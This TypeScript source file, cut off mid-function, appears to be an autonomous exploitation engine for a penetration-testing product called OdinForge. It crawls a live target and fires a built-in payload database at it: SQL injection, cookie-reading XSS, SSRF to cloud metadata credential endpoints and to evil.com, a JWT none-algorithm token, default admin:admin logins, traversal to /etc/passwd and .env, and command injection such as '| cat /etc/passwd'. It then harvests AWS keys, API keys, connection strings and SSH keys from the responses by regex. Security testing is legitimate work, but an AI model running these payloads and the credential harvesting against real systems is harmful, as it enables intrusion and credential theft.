/**
 * OdinForge Active Exploit Engine
 *
 * Autonomous exploitation layer that validates vulnerabilities against live targets.
 * Sits between recon and the existing AI analysis pipeline in Phase 1 (Application Compromise).
 *
 * Shannon equivalent: Their entire exploit validation pipeline.
 * OdinForge advantage: Results feed directly into Phases 2-6 (credential extraction,
 * cloud escalation, K8s breakout, lateral movement, impact assessment).
 *
 * Architecture:
 *   1. Target Crawling    — Map live endpoints, parameters, auth flows
 *   2. Payload Generation — Build exploit payloads per discovered vector
 *   3. Active Exploitation — Fire payloads against live target, capture responses
 *   4. Response Validation — Confirm exploitation with evidence
 *   5. Credential Harvest  — Extract real credentials from exploit responses
 *   6. Evidence Assembly   — Package reproducible PoCs for reporting
 */

import axios, { AxiosInstance, AxiosResponse, AxiosRequestConfig } from 'axios';
import * as cheerio from 'cheerio';
import * as crypto from 'crypto';

// ═══════════════════════════════════════════════════════════════════════════════
// Types
// ═══════════════════════════════════════════════════════════════════════════════

export interface ActiveExploitTarget {
  baseUrl: string;
  assetId: string;
  scope: ExploitScope;
  authentication?: TargetAuth;
  headers?: Record<string, string>;
  timeout?: number;        // ms per request, default 10000
  maxRequests?: number;    // rate limit, default 100
  crawlDepth?: number;     // default 3
}

export interface ExploitScope {
  includePaths?: string[];      // regex patterns to include
  excludePaths?: string[];      // regex patterns to exclude
  exposureTypes: ExposureType[];
  maxEndpoints?: number;        // cap discovery, default 200
}

export type ExposureType =
  | 'sqli' | 'xss' | 'ssrf' | 'auth_bypass' | 'idor'
  | 'path_traversal' | 'command_injection' | 'jwt_abuse'
  | 'api_abuse' | 'business_logic';

export interface TargetAuth {
  type: 'bearer' | 'cookie' | 'basic' | 'api_key' | 'form_login';
  credentials: Record<string, string>;
  loginUrl?: string;
  tokenField?: string;
}

export interface DiscoveredEndpoint {
  url: string;
  method: 'GET' | 'POST' | 'PUT' | 'DELETE' | 'PATCH';
  parameters: DiscoveredParameter[];
  headers: Record<string, string>;
  authenticated: boolean;
  contentType?: string;
  responseCode?: number;
  technology?: string[];    // detected tech (express, django, etc.)
}

export interface DiscoveredParameter {
  name: string;
  location: 'query' | 'body' | 'path' | 'header' | 'cookie';
  type: 'string' | 'number' | 'boolean' | 'json' | 'unknown';
  sampleValue?: string;
  required: boolean;
}

export interface ExploitPayload {
  id: string;
  type: ExposureType;
  name: string;
  payload: string;
  parameter: string;
  location: 'query' | 'body' | 'path' | 'header' | 'cookie';
  detection: PayloadDetection;
  severity: 'critical' | 'high' | 'medium' | 'low';
  cwe: string;
  mitreTactic: string;
  mitreId: string;
}

export interface PayloadDetection {
  /** Patterns in response body that confirm exploitation */
  successPatterns: RegExp[];
  /** HTTP status codes that indicate success */
  successCodes?: number[];
  /** Response time threshold (ms) for time-based detection */
  timingThreshold?: number;
  /** Check for data leakage patterns */
  dataLeakPatterns?: RegExp[];
}

export interface ExploitAttempt {
  payload: ExploitPayload;
  endpoint: DiscoveredEndpoint;
  request: CapturedRequest;
  response: CapturedResponse;
  validated: boolean;
  confidence: number;       // 0-1
  evidence: ExploitEvidence;
  timestamp: string;
  durationMs: number;
}

export interface CapturedRequest {
  method: string;
  url: string;
  headers: Record<string, string>;
  body?: string;
  timestamp: string;
}

export interface CapturedResponse {
  statusCode: number;
  headers: Record<string, string>;
  body: string;
  bodyTruncated: boolean;
  size: number;
  durationMs: number;
  timestamp: string;
}

export interface ExploitEvidence {
  type: 'response_match' | 'data_leak' | 'error_disclosure' | 'timing' | 'behavior_change';
  description: string;
  matchedPatterns: string[];
  extractedData?: string[];
  screenshot?: string;        // base64, if headless browser available
  reproducible: boolean;
  curlCommand: string;        // reproducible PoC
}

export interface HarvestedCredential {
  type: 'database' | 'api_key' | 'jwt_secret' | 'password' | 'token' | 'cloud_credential' | 'ssh_key' | 'connection_string';
  value: string;
  context: string;            // where it was found
  source: string;             // which exploit extracted it
  hash: string;               // for dedup
  accessLevel: 'read' | 'write' | 'admin' | 'unknown';
}

export interface ActiveExploitResult {
  target: ActiveExploitTarget;
  crawl: CrawlResult;
  attempts: ExploitAttempt[];
  validated: ExploitAttempt[];    // only confirmed exploits
  credentials: HarvestedCredential[];
  attackPaths: DiscoveredAttackPath[];
  summary: ExploitSummary;
  startTime: string;
  endTime: string;
  durationMs: number;
}

export interface CrawlResult {
  endpoints: DiscoveredEndpoint[];
  totalDiscovered: number;
  technologies: string[];
  authFlows: string[];
  sitemapFound: boolean;
  robotsFound: boolean;
  apiSpecFound: boolean;
}

export interface DiscoveredAttackPath {
  id: string;
  name: string;
  steps: AttackPathStep[];
  entryPoint: string;
  finalImpact: string;
  riskScore: number;
  mitreTactics: string[];
}

export interface AttackPathStep {
  order: number;
  action: string;
  technique: string;
  mitreId: string;
  evidence: string;
  credentialsUsed?: string[];
  credentialsGained?: string[];
}

export interface ExploitSummary {
  totalEndpoints: number;
  totalAttempts: number;
  totalValidated: number;
  totalCredentials: number;
  criticalFindings: number;
  highFindings: number;
  attackPathsFound: number;
  exposureTypes: Record<string, number>;
  successRate: number;
}

/** Progress callback compatible with breach orchestrator */
export type ExploitProgressCallback = (phase: string, progress: number, detail: string) => void;


// ═══════════════════════════════════════════════════════════════════════════════
// Payload Database
// ═══════════════════════════════════════════════════════════════════════════════

const PAYLOAD_DB: Record<ExposureType, Omit<ExploitPayload, 'id' | 'parameter' | 'location'>[]> = {
  sqli: [
    {
      type: 'sqli',
      name: 'Union-based SQLi (string)',
      payload: "' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables--",
      detection: {
        successPatterns: [
          /information_schema/i, /table_name/i, /pg_catalog/i, /mysql\./i,
          /sqlite_master/i, /UNION/i, /column_name/i
        ],
        dataLeakPatterns: [/password/i, /secret/i, /token/i, /api_key/i, /credentials/i]
      },
      severity: 'critical',
      cwe: 'CWE-89',
      mitreTactic: 'initial-access',
      mitreId: 'T1190'
    },
    {
      type: 'sqli',
      name: 'Boolean-based blind SQLi',
      payload: "' AND 1=1--",
      detection: {
        successPatterns: [], // validated by response diff with "' AND 1=2--"
        successCodes: [200]
      },
      severity: 'critical',
      cwe: 'CWE-89',
      mitreTactic: 'initial-access',
      mitreId: 'T1190'
    },
    {
      type: 'sqli',
      name: 'Error-based SQLi',
      payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
      detection: {
        successPatterns: [
          /SQL syntax/i, /mysql_fetch/i, /pg_query/i, /ORA-\d+/i,
          /Microsoft SQL Server/i, /SQLSTATE/i, /syntax error/i,
          /unterminated/i, /postgresql/i, /mariadb/i
        ]
      },
      severity: 'critical',
      cwe: 'CWE-89',
      mitreTactic: 'initial-access',
      mitreId: 'T1190'
    },
    {
      type: 'sqli',
      name: 'Time-based blind SQLi',
      payload: "' AND SLEEP(5)--",
      detection: {
        successPatterns: [],
        timingThreshold: 4500  // 5s sleep minus network jitter
      },
      severity: 'critical',
      cwe: 'CWE-89',
      mitreTactic: 'initial-access',
      mitreId: 'T1190'
    },
    {
      type: 'sqli',
      name: 'Stacked queries SQLi',
      payload: "'; SELECT pg_sleep(5);--",
      detection: {
        successPatterns: [],
        timingThreshold: 4500
      },
      severity: 'critical',
      cwe: 'CWE-89',
      mitreTactic: 'initial-access',
      mitreId: 'T1190'
    },
    {
      type: 'sqli',
      name: 'NoSQL injection (MongoDB)',
      payload: '{"$gt":""}',
      detection: {
        successPatterns: [/MongoError/i, /\$where/i, /ObjectId/i],
        dataLeakPatterns: [/_id/i, /password/i, /email/i]
      },
      severity: 'critical',
      cwe: 'CWE-943',
      mitreTactic: 'initial-access',
      mitreId: 'T1190'
    }
  ],

  xss: [
    {
      type: 'xss',
      name: 'Reflected XSS (script tag)',
      payload: '<script>alert("OdinForge-XSS-" + document.cookie)</script>',
      detection: {
        successPatterns: [/<script>alert\("OdinForge-XSS-/i]
      },
      severity: 'high',
      cwe: 'CWE-79',
      mitreTactic: 'initial-access',
      mitreId: 'T1189'
    },
    {
      type: 'xss',
      name: 'Reflected XSS (event handler)',
      payload: '"><img src=x onerror="alert(\'OdinForge-XSS\')">',
      detection: {
        successPatterns: [/onerror="alert\('OdinForge-XSS'\)"/i]
      },
      severity: 'high',
      cwe: 'CWE-79',
      mitreTactic: 'initial-access',
      mitreId: 'T1189'
    },
    {
      type: 'xss',
      name: 'DOM-based XSS (svg)',
      payload: '<svg onload="alert(\'OdinForge-XSS\')">',
      detection: {
        successPatterns: [/<svg onload="alert\('OdinForge-XSS'\)">/i]
      },
      severity: 'high',
      cwe: 'CWE-79',
      mitreTactic: 'initial-access',
      mitreId: 'T1189'
    },
    {
      type: 'xss',
      name: 'Polyglot XSS',
      payload: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(\'OdinForge-XSS\') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(\'OdinForge-XSS\')//>\\x3e',
      detection: {
        successPatterns: [/oNcliCk=alert/i, /oNloAd=alert/i]
      },
      severity: 'high',
      cwe: 'CWE-79',
      mitreTactic: 'initial-access',
      mitreId: 'T1189'
    }
  ],

  ssrf: [
    {
      type: 'ssrf',
      name: 'SSRF to cloud metadata (AWS)',
      payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      detection: {
        successPatterns: [
          /AccessKeyId/i, /SecretAccessKey/i, /iam/i,
          /security-credentials/i, /instance-id/i, /ami-id/i
        ],
        dataLeakPatterns: [/AKIA[A-Z0-9]{16}/i, /aws_secret/i]
      },
      severity: 'critical',
      cwe: 'CWE-918',
      mitreTactic: 'initial-access',
      mitreId: 'T1190'
    },
    {
      type: 'ssrf',
      name: 'SSRF to cloud metadata (GCP)',
      payload: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
      detection: {
        successPatterns: [/access_token/i, /token_type/i, /service-accounts/i]
      },
      severity: 'critical',
      cwe: 'CWE-918',
      mitreTactic: 'initial-access',
      mitreId: 'T1190'
    },
    {
      type: 'ssrf',
      name: 'SSRF to internal services',
      payload: 'http://127.0.0.1:6379/INFO',
      detection: {
        successPatterns: [/redis_version/i, /connected_clients/i, /tcp_port/i]
      },
      severity: 'high',
      cwe: 'CWE-918',
      mitreTactic: 'discovery',
      mitreId: 'T1046'
    },
    {
      type: 'ssrf',
      name: 'SSRF via URL redirect',
      payload: 'http://127.0.0.1:80@evil.com/',
      detection: {
        successPatterns: [/localhost/i, /127\.0\.0\.1/i, /internal/i]
      },
      severity: 'high',
      cwe: 'CWE-918',
      mitreTactic: 'initial-access',
      mitreId: 'T1190'
    }
  ],

  auth_bypass: [
    {
      type: 'auth_bypass',
      name: 'JWT none algorithm',
      payload: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.',
      detection: {
        successPatterns: [/admin/i, /authorized/i, /welcome/i, /dashboard/i],
        successCodes: [200, 302]
      },
      severity: 'critical',
      cwe: 'CWE-287',
      mitreTactic: 'initial-access',
      mitreId: 'T1078'
    },
    {
      type: 'auth_bypass',
      name: 'Default credentials (admin:admin)',
      payload: 'admin:admin',
      detection: {
        successPatterns: [/dashboard/i, /welcome/i, /logged.?in/i, /session/i],
        successCodes: [200, 302]
      },
      severity: 'critical',
      cwe: 'CWE-798',
      mitreTactic: 'initial-access',
      mitreId: 'T1078.001'
    },
    {
      type: 'auth_bypass',
      name: 'Path traversal auth bypass',
      payload: '/..;/admin',
      detection: {
        successPatterns: [/admin/i, /dashboard/i, /management/i, /configuration/i],
        successCodes: [200]
      },
      severity: 'critical',
      cwe: 'CWE-287',
      mitreTactic: 'initial-access',
      mitreId: 'T1078'
    },
    {
      type: 'auth_bypass',
      name: 'HTTP method override',
      payload: 'X-HTTP-Method-Override: DELETE',
      detection: {
        successPatterns: [/deleted/i, /success/i, /removed/i],
        successCodes: [200, 204]
      },
      severity: 'high',
      cwe: 'CWE-287',
      mitreTactic: 'initial-access',
      mitreId: 'T1078'
    }
  ],

  idor: [
    {
      type: 'idor',
      name: 'Sequential ID enumeration',
      payload: 'id=1',
      detection: {
        successPatterns: [],
        dataLeakPatterns: [/email/i, /password/i, /phone/i, /address/i, /ssn/i, /credit/i]
      },
      severity: 'high',
      cwe: 'CWE-639',
      mitreTactic: 'collection',
      mitreId: 'T1530'
    },
    {
      type: 'idor',
      name: 'UUID prediction',
      payload: 'userId=00000000-0000-0000-0000-000000000001',
      detection: {
        successPatterns: [],
        successCodes: [200],
        dataLeakPatterns: [/email/i, /name/i, /role/i]
      },
      severity: 'high',
      cwe: 'CWE-639',
      mitreTactic: 'collection',
      mitreId: 'T1530'
    }
  ],

  path_traversal: [
    {
      type: 'path_traversal',
      name: 'Path traversal (Linux passwd)',
      payload: '../../../../etc/passwd',
      detection: {
        successPatterns: [/root:.*:0:0/i, /bin\/bash/i, /sbin\/nologin/i]
      },
      severity: 'critical',
      cwe: 'CWE-22',
      mitreTactic: 'collection',
      mitreId: 'T1005'
    },
    {
      type: 'path_traversal',
      name: 'Path traversal (env file)',
      payload: '../../../../.env',
      detection: {
        successPatterns: [/DATABASE_URL/i, /API_KEY/i, /SECRET/i, /PASSWORD/i],
        dataLeakPatterns: [/postgres:\/\//i, /mysql:\/\//i, /mongodb:\/\//i, /redis:\/\//i, /sk-[a-zA-Z0-9]+/i]
      },
      severity: 'critical',
      cwe: 'CWE-22',
      mitreTactic: 'credential-access',
      mitreId: 'T1552.001'
    },
    {
      type: 'path_traversal',
      name: 'Path traversal (Windows)',
      payload: '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      detection: {
        successPatterns: [/localhost/i, /127\.0\.0\.1/i, /\# Copyright/i]
      },
      severity: 'critical',
      cwe: 'CWE-22',
      mitreTactic: 'collection',
      mitreId: 'T1005'
    }
  ],

  command_injection: [
    {
      type: 'command_injection',
      name: 'OS command injection (semicolon)',
      payload: '; id; echo OdinForge-RCE',
      detection: {
        successPatterns: [/uid=\d+/i, /OdinForge-RCE/i, /gid=\d+/i]
      },
      severity: 'critical',
      cwe: 'CWE-78',
      mitreTactic: 'execution',
      mitreId: 'T1059'
    },
    {
      type: 'command_injection',
      name: 'OS command injection (backtick)',
      payload: '`id`',
      detection: {
        successPatterns: [/uid=\d+/i, /gid=\d+/i, /groups=/i]
      },
      severity: 'critical',
      cwe: 'CWE-78',
      mitreTactic: 'execution',
      mitreId: 'T1059'
    },
    {
      type: 'command_injection',
      name: 'OS command injection (pipe)',
      payload: '| cat /etc/passwd',
      detection: {
        successPatterns: [/root:.*:0:0/i, /bin\/bash/i]
      },
      severity: 'critical',
      cwe: 'CWE-78',
      mitreTactic: 'execution',
      mitreId: 'T1059'
    }
  ],

  jwt_abuse: [
    {
      type: 'jwt_abuse',
      name: 'JWT secret brute force (weak key)',
      payload: 'secret',  // common weak secrets
      detection: {
        successPatterns: [/valid/i, /authenticated/i],
        successCodes: [200]
      },
      severity: 'critical',
      cwe: 'CWE-347',
      mitreTactic: 'credential-access',
      mitreId: 'T1552'
    },
    {
      type: 'jwt_abuse',
      name: 'JWT kid header injection',
      payload: '{"kid":"../../dev/null","alg":"HS256"}',
      detection: {
        successPatterns: [/admin/i, /authorized/i],
        successCodes: [200]
      },
      severity: 'critical',
      cwe: 'CWE-347',
      mitreTactic: 'credential-access',
      mitreId: 'T1552'
    }
  ],

  api_abuse: [
    {
      type: 'api_abuse',
      name: 'Mass assignment (role escalation)',
      payload: '{"role":"admin","isAdmin":true}',
      detection: {
        successPatterns: [/admin/i, /elevated/i, /role.*admin/i],
        successCodes: [200]
      },
      severity: 'high',
      cwe: 'CWE-915',
      mitreTactic: 'privilege-escalation',
      mitreId: 'T1078'
    },
    {
      type: 'api_abuse',
      name: 'Rate limit bypass (header rotation)',
      payload: 'X-Forwarded-For: 127.0.0.1',
      detection: {
        successPatterns: [],
        successCodes: [200]  // should get 429 if rate limiting works
      },
      severity: 'medium',
      cwe: 'CWE-770',
      mitreTactic: 'impact',
      mitreId: 'T1499'
    },
    {
      type: 'api_abuse',
      name: 'GraphQL introspection',
      payload: '{"query":"{__schema{types{name fields{name type{name}}}}}"}',
      detection: {
        successPatterns: [/__schema/i, /queryType/i, /mutationType/i],
        dataLeakPatterns: [/password/i, /secret/i, /token/i, /admin/i]
      },
      severity: 'medium',
      cwe: 'CWE-200',
      mitreTactic: 'discovery',
      mitreId: 'T1087'
    }
  ],

  business_logic: [
    {
      type: 'business_logic',
      name: 'Price manipulation (negative value)',
      payload: '-1',
      detection: {
        successPatterns: [/success/i, /order.*placed/i, /confirmed/i],
        successCodes: [200, 201]
      },
      severity: 'high',
      cwe: 'CWE-840',
      mitreTactic: 'impact',
      mitreId: 'T1565'
    },
    {
      type: 'business_logic',
      name: 'Workflow bypass (skip step)',
      payload: 'step=3',
      detection: {
        successPatterns: [/success/i, /complete/i],
        successCodes: [200]
      },
      severity: 'medium',
      cwe: 'CWE-840',
      mitreTactic: 'defense-evasion',
      mitreId: 'T1548'
    }
  ]
};


// ═══════════════════════════════════════════════════════════════════════════════
// Credential Extraction Patterns (for real response parsing)
// ═══════════════════════════════════════════════════════════════════════════════

interface CredentialPattern {
  type: HarvestedCredential['type'];
  pattern: RegExp;
  accessLevel: HarvestedCredential['accessLevel'];
}

const CREDENTIAL_PATTERNS: CredentialPattern[] = [
  // AWS
  { type: 'cloud_credential', pattern: /AKIA[A-Z0-9]{16}/g, accessLevel: 'admin' },
  { type: 'cloud_credential', pattern: /aws_secret_access_key\s*[=:]\s*["']?([A-Za-z0-9/+=]{40})["']?/gi, accessLevel: 'admin' },
  // Database connection strings
  { type: 'connection_string', pattern: /(?:postgres|mysql|mongodb|redis):\/\/[^\s"'<>]+/gi, accessLevel: 'admin' },
  // JWT secrets
  { type: 'jwt_secret', pattern: /(?:JWT_SECRET|SECRET_KEY|TOKEN_SECRET)\s*[=:]\s*["']?([^\s"']+)["']?/gi, accessLevel: 'admin' },
  // API keys
  { type: 'api_key', pattern: /(?:api[_-]?key|apikey)\s*[=:]\s*["']?([a-zA-Z0-9_\-]{20,})["']?/gi, accessLevel: 'write' },
  // OpenAI / Anthropic keys
  { type: 'api_key', pattern: /sk-[a-zA-Z0-9]{20,}/g, accessLevel: 'write' },
  // Passwords in config
  { type: 'password', pattern: /(?:password|passwd|pwd)\s*[=:]\s*["']?([^\s"']{4,})["']?/gi, accessLevel: 'unknown' },
  // Bearer tokens
  { type: 'token', pattern: /Bearer\s+([A-Za-z0-9\-._~+/]+=*)/gi, accessLevel: 'write' },
  // SSH private keys
  { type: 'ssh_key', pattern: /-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/gi, accessLevel: 'admin' },
  // Generic secrets
  { type: 'password', pattern: /(?:SECRET|PRIVATE_KEY|ENCRYPTION_KEY)\s*[=:]\s*["']?([^\s"']{8,})["']?/gi, accessLevel: 'unknown' },
];


// ═══════════════════════════════════════════════════════════════════════════════
// Core Engine
// ═══════════════════════════════════════════════════════════════════════════════

export class ActiveExploitEngine {
  private client: AxiosInstance;
  private target: ActiveExploitTarget;
  private requestCount = 0;
  private discoveredEndpoints: DiscoveredEndpoint[] = [];
  private attempts: ExploitAttempt[] = [];
  private credentials: HarvestedCredential[] = [];
  private onProgress?: ExploitProgressCallback;
  private aborted = false;

  constructor(target: ActiveExploitTarget, onProgress?: ExploitProgressCallback) {
    this.target = target;
    this.onProgress = onProgress;
    this.client = axios.create({
      baseURL: target.baseUrl,
      timeout: target.timeout || 10000,
      maxRedirects: 3,
      validateStatus: () => true,  // don't throw on any status code
      headers: {
        'User-Agent': 'OdinForge-AEV/1.0 (Security Assessment)',
        ...(target.headers || {})
      }
    });
  }

  /** Abort the engine mid-run */
  abort(): void {
    this.aborted = true;
  }

  /**
   * Main entry point — runs full autonomous exploitation pipeline.
   * Returns results compatible with breach orchestrator Phase 1.
   */
  async run(): Promise<ActiveExploitResult> {
    const startTime = new Date();
    this.progress('initializing', 0, 'Starting active exploitation engine');

    try {
      // Phase A: Authentication
      if (this.target.authentication) {
        this.progress('auth', 5, 'Authenticating to target');
        await this.authenticate();
      }

      // Phase B: Crawl & Discovery
      this.progress('crawl', 10, 'Crawling target for endpoints');
      const crawlResult = await this.crawlTarget();

      if (this.aborted) return this.buildResult(crawlResult, startTime);

      // Phase C: Payload Generation & Execution
      this.progress('exploit', 30, `Testing ${crawlResult.endpoints.length} endpoints`);
      await this.executeExploits(crawlResult.endpoints);

      if (this.aborted) return this.buildResult(crawlResult, startTime);

      // Phase D: Credential Harvest from validated exploits
      this.progress('harvest', 80, 'Extracting credentials from exploit results');
      this.harvestCredentials();

      // Phase E: Attack Path Assembly
      this.progress('paths', 90, 'Building attack paths from findings');
      const attackPaths = this.buildAttackPaths();

      // Phase F: Result Assembly
      this.progress('complete', 100, 'Exploitation complete');
      return this.buildResult(crawlResult, startTime, attackPaths);

    } catch (error: any) {
      this.progress('error', -1, `Engine error: ${error.message}`);
      throw error;
    }
  }


  // ═════════════════════════════════════════════════════════════════════
  // Phase A: Authentication
  // ═════════════════════════════════════════════════════════════════════

  private async authenticate(): Promise<void> {
    const auth = this.target.authentication!;

    switch (auth.type) {
      case 'bearer':
        this.client.defaults.headers.common['Authorization'] = `Bearer ${auth.credentials.token}`;
        break;

      case 'api_key': {
        const keyHeader = auth.credentials.header || 'X-API-Key';
        this.client.defaults.headers.common[keyHeader] = auth.credentials.key;
        break;
      }

      case 'basic': {
        const basicAuth = Buffer.from(`${auth.credentials.username}:${auth.credentials.password}`).toString('base64');
        this.client.defaults.headers.common['Authorization'] = `Basic ${basicAuth}`;
        break;
      }

      case 'cookie':
        this.client.defaults.headers.common['Cookie'] = auth.credentials.cookie;
        break;

      case 'form_login':
        if (auth.loginUrl) {
          const loginResp = await this.makeRequest({
            method: 'POST',
            url: auth.loginUrl,
            data: auth.credentials,
            headers: { 'Content-Type': 'application/json' }
          });
          // Extract session cookie or token from response
          const setCookie = loginResp.headers['set-cookie'];
          if (setCookie) {
            this.client.defaults.headers.common['Cookie'] =
              Array.isArray(setCookie) ? setCookie.join('; ') : setCookie;
          }
          // Check for token in response body
          if (auth.tokenField && loginResp.data) {
            const token = typeof loginResp.data === 'object'
              ? loginResp.data[auth.tokenField]
              : null;
            if (token) {
              this.client.defaults.headers.common['Authorization'] = `Bearer ${token}`;
            }
          }
        }
        break;
    }
  }


  // ═════════════════════════════════════════════════════════════════════
  // Phase B: Target Crawling
  // ═════════════════════════════════════════════════════════════════════

  private async crawlTarget(): Promise<CrawlResult> {
    const endpoints: DiscoveredEndpoint[] = [];
    const technologies: Set<string> = new Set();
    const authFlows: string[] = [];
    let sitemapFound = false;
    let robotsFound = false;
    let apiSpecFound = false;
    const maxEndpoints = this.target.scope.maxEndpoints || 200;
    const visited = new Set<string>();
    const queue: string[] = ['/'];

    // 1. Check robots.txt
    try {
      const robotsResp = await this.makeRequest({ method: 'GET', url: '/robots.txt' });
      if (robotsResp.status === 200 && typeof robotsResp.data === 'string') {
        robotsFound = true;
        const paths = robotsResp.data.match(/(?:Disallow|Allow):\s*(\S+)/gi) || [];
        for (const p of paths) {
          const path = p.replace(/(?:Disallow|Allow):\s*/i, '').trim();
          if (path && path !== '/' && !visited.has(path)) {
            queue.push(path);
          }
        }
      }
    } catch { /* skip */ }

    // 2. Check sitemap.xml
    try {
      const sitemapResp = await this.makeRequest({ method: 'GET', url: '/sitemap.xml' });
      if (sitemapResp.status === 200) {
        sitemapFound = true;
        const urls = (typeof sitemapResp.data === 'string' ? sitemapResp.data : '').match(/<loc>(.*?)<\/loc>/gi) || [];
        for (const u of urls.slice(0, 50)) {
          const url = u.replace(/<\/?loc>/gi, '');
          try {
            const parsed = new URL(url);
            if (!visited.has(parsed.pathname)) {
              queue.push(parsed.pathname);
            }
          } catch { /* skip invalid URLs */ }
        }
      }
    } catch { /* skip */ }

    // 3. Check common API spec endpoints
    const apiSpecPaths = ['/api-docs', '/swagger.json', '/openapi.json', '/api/v1/docs', '/graphql'];
    for (const specPath of apiSpecPaths) {
      if (this.aborted) break;
      try {
        const specResp = await this.makeRequest({ method: 'GET', url: specPath });
        if (specResp.status === 200) {
          apiSpecFound = true;
          // Extract paths from OpenAPI spec
          if (typeof specResp.data === 'object' && specResp.data?.paths) {
            for (const [path, methods] of Object.entries(specResp.data.paths as Record<string, any>)) {
              for (const method of Object.keys(methods)) {
                if (['get', 'post', 'put', 'delete', 'patch'].includes(method.toLowerCase())) {
                  const endpoint = this.buildEndpointFromSpec(path, method.toUpperCase(), methods[method]);
                  if (endpoint) endpoints.push(endpoint);
                }
              }
            }
          }
        }
      } catch { /* skip */ }
    }

    // 4. Breadth-first crawl
    const crawlDepth = this.target.crawlDepth || 3;
    let depth = 0;

    while (queue.length > 0 && endpoints.length < maxEndpoints && depth < crawlDepth && !this.aborted) {
      const currentBatch = [...queue];
      queue.length = 0;
      depth++;

      for (const path of currentBatch) {
        if (endpoints.length >= maxEndpoints || this.aborted) break;
        if (visited.has(path)) continue;
        visited.add(path);

        // Skip excluded paths
        if (this.isExcluded(path)) continue;

        try {
          const resp = await this.makeRequest({ method: 'GET', url: path });

          // Detect technologies from headers/body
          this.detectTechnologies(resp, technologies);

          // Build endpoint
          const endpoint = this.buildEndpointFromResponse(path, 'GET', resp);
          if (endpoint) endpoints.push(endpoint);

          // Extract links for further crawling
          if (typeof resp.data === 'string' && resp.headers['content-type']?.includes('html')) {
            const links = this.extractLinks(resp.data, path);
            for (const link of links) {
              if (!visited.has(link) && !this.isExcluded(link)) {
                queue.push(link);
              }
            }
          }

          // Check for forms to discover POST endpoints
          if (typeof resp.data === 'string') {
            const formEndpoints = this.extractFormEndpoints(resp.data, path);
            endpoints.push(...formEndpoints.filter(() => endpoints.length < maxEndpoints));
          }

        } catch { /* skip unreachable paths */ }
      }

      this.progress('crawl', 10 + Math.min(20, (endpoints.length / maxEndpoints) * 20),
        `Discovered ${endpoints.length} endpoints (depth ${depth}/${crawlDepth})`);
    }

    // 5. Common path brute force
    const commonPaths = [
      '/api', '/api/v1', '/api/v2', '/admin', '/login', '/register',
      '/api/users', '/api/auth', '/api/auth/login', '/api/auth/register',
      '/api/config', '/api/settings', '/api/admin', '/api/debug',
      '/api/health', '/api/status', '/api/version',
      '/graphql', '/api/graphql', '/.env', '/debug', '/console',
      '/api/users/1', '/api/users/me', '/api/profile'
    ];

    for (const path of commonPaths) {
      if (endpoints.length >= maxEndpoints || this.aborted) break;
      if (visited.has(path)) continue;
      visited.add(path);

      try {
        const resp = await this.makeRequest({ method: 'GET', url: path });
        if (resp.status < 404) {
          const endpoint = this.buildEndpointFromResponse(path, 'GET', resp);
          if (endpoint) endpoints.push(endpoint);
        }
      } catch { /* skip */ }
    }

    this.discoveredEndpoints = endpoints;

    return {
      endpoints,
      totalDiscovered: endpoints.length,
      technologies: Array.from(technologies),
      authFlows,
      sitemapFound,
      robotsFound,
      apiSpecFound
    };
  }


  // ═════════════════════════════════════════════════════════════════════
  // Phase C: Active Exploitation
  // ═════════════════════════════════════════════════════════════════════

  private async executeExploits(endpoints: DiscoveredEndpoint[]): Promise<void> {
    const enabledTypes = this.target.scope.exposureTypes;
    let completed = 0;
    const totalEndpoints = endpoints.length;

    for (const endpoint of endpoints) {
      if (this.aborted) break;

      for (const exposureType of enabledTypes) {
        if (this.aborted) break;

        const payloads = PAYLOAD_DB[exposureType] || [];

        for (const payloadDef of payloads) {
          if (this.aborted) break;
          if (this.requestCount >= (this.target.maxRequests || 500)) {
            this.progress('exploit', 80, 'Request limit reached');
            return;
          }

          // Test each parameter on the endpoint
          const params = endpoint.parameters.length > 0
            ? endpoint.parameters
            : [{ name: 'input', location: 'query' as const, type: 'string' as const, required: false }];

          for (const param of params) {
            if (this.aborted) break;

            const payload: ExploitPayload = {
              id: crypto.randomUUID(),
              ...payloadDef,
              parameter: param.name,
              location: param.location,
            };

            const attempt = await this.firePayload(endpoint, payload);
            if (attempt) {
              this.attempts.push(attempt);
            }
          }
        }
      }

      completed++;
      if (completed % 5 === 0) {
        const validated = this.attempts.filter(a => a.validated).length;
        this.progress('exploit', 30 + Math.min(50, (completed / totalEndpoints) * 50),
          `${completed}/${totalEndpoints} endpoints tested, ${validated} validated findings`);
      }
    }
  }

  /**
   * Fire a single exploit payload against an endpoint and validate the response.
   */
  private async firePayload(endpoint: DiscoveredEndpoint, payload: ExploitPayload): Promise<ExploitAttempt | null> {
    const startTime = Date.now();
    let config: AxiosRequestConfig;

    try {
      config = this.buildExploitRequest(endpoint, payload);
    } catch {
      return null;
    }

    try {
      const requestTimestamp = new Date().toISOString();
      const resp = await this.makeRequest(config);
      const durationMs = Date.now() - startTime;

      const capturedRequest: CapturedRequest = {
        method: config.method || 'GET',
        url: `${this.target.baseUrl}${config.url || ''}`,
        headers: config.headers as Record<string, string> || {},
        body: typeof config.data === 'string' ? config.data : JSON.stringify(config.data),
        timestamp: requestTimestamp,
      };

      const responseBody = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data || '');
      const capturedResponse: CapturedResponse = {
        statusCode: resp.status,
        headers: resp.headers as Record<string, string>,
        body: responseBody.substring(0, 10000),
        bodyTruncated: responseBody.length > 10000,
        size: responseBody.length,
        durationMs,
        timestamp: new Date().toISOString(),
      };

      // Validate the exploit
      const validation = this.validateExploit(payload, capturedResponse, durationMs);

      const evidence: ExploitEvidence = {
        type: validation.evidenceType,
        description: validation.description,
        matchedPatterns: validation.matchedPatterns,
        extractedData: validation.extractedData,
        reproducible: true,
        curlCommand: this.buildCurlCommand(capturedRequest),
      };

      return {
        payload,
        endpoint,
        request: capturedRequest,
        response: capturedResponse,
        validated: validation.confirmed,
        confidence: validation.confidence,
        evidence,
